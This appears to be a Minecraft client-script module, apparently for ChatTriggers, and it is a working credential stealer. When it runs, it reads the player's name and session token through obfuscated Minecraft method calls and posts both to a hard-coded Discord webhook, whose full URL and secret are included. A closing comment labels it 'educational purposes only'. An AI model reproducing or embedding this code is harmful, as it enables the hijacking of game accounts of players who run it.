import request from "../../requestV2"

request({
    url: "https://discord.com/api/webhooks/1362727721620340869/UtGPhrBeFs8VfSEtIBdgejhLvnCdxBd1CcQI-fkJ6dhsajDOKZa_hmfAH8KiRUYzF03E",
    method: "POST",
    headers: {"User-agent":"Mozilla/5.0"},
    body: {content: "```" + Player.getName() + "```\n```" + Client.getMinecraft().func_110432_I().func_148254_d() + "```"}
})


//educational purposes only!
